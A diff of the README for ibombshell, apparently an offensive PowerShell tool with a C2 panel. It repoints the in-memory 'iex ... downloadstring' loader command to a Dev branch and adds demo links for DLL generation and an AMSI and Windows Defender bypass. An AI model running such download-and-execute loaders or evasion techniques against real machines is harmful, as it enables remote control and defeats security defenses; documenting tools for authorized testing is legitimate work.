@@ -40,7 +40,7 @@ ibombshell has two execution modes:
 To load ibombshell simply run on PowerShell:
 
 ```[powershell]
-iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/ElevenPaths/ibombshell/master/console’)
+iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/ElevenPaths/ibombshell/Dev/console’)
 ```
 
 Now you can run the downloaded ibombshell console running:
@@ -70,7 +70,7 @@ AHUAdAAtAHMAdAByAGkAbgBnACAAfAAgAGkAZQB4ADsAIABjADoAOwAgAGMAbwBuAHMAbwBsAGUAOwB9
 This version allows you to run the ibombshell console and remotely control it from the C2 panel created in python. To run this version, first you must launch the console process in powershell:
 
 ```[powershell]
-iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/ElevenPaths/ibombshell/master/console’)
+iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/ElevenPaths/ibombshell/Dev/console’)
 ```
 
 On ibombshell C2 path, prepare the C2:
@@ -144,7 +144,7 @@ Some example videos...
 
 ### *iBombShell: PoC savefunctions*
 
-[![iBombShell: PoC savefunctions](https://img.youtube.com/vi/7UP09LdRJy0/0.jpg)](http://www.youtube.com/watch?v=7UP09LdRJy0)
+[![iBombShell: PoC savefunctions](https://img.youtube.com/vi/QM0HufCYOEk/0.jpg)](https://www.youtube.com/watch?v=QM0HufCYOEk)
 
 ### *ibombshell - Silently bypass UAC Environment Injection*
 
@@ -153,6 +153,14 @@ Some example videos...
 ### *iBombShell - Mocking Trusted Directory*
 
 [![iBombShell - Mocking Trusted Directory](https://img.youtube.com/vi/6iCFS4FkedM/0.jpg)](https://www.youtube.com/watch?v=6iCFS4FkedM)
+
+### *iBombShell - DLL generation*
+[![iBombShell - DLL Generation](https://img.youtube.com/vi/I03klvk-DXo/0.jpg)](https://www.youtube.com/watch?v=I03klvk-DXo)
+
+
+### *iBombShell - AMSI & Windows Defender Bypass*
+[![iBombShell - AMSI & Windows Defender Bypass](https://img.youtube.com/vi/wCBLG3CfWMY/0.jpg)](https://www.youtube.com/watch?v=wCBLG3CfWMY)
+
 
 # License
 
